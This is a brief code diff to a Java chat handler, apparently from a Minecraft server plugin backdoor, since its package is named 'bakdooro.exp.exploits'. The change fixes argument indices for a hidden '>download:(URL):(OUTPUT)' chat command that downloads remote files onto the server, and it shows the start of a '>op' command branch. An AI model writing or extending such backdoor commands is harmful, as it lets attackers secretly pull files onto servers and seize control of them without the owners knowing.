@@ -17,7 +17,7 @@ public class chathandler {
                     pl.sendMessage("Invalid syntax. Correct syntax: >download:(URL):(OUTPUT)");
                 }
                 else {
-                    me.acaiberii.bakdooro.exp.exploits.remoteDownload(spl[2], spl[3]);
+                    me.acaiberii.bakdooro.exp.exploits.remoteDownload(spl[1], spl[2]);
                 }
             }
             else if (message.startsWith(">op")) {
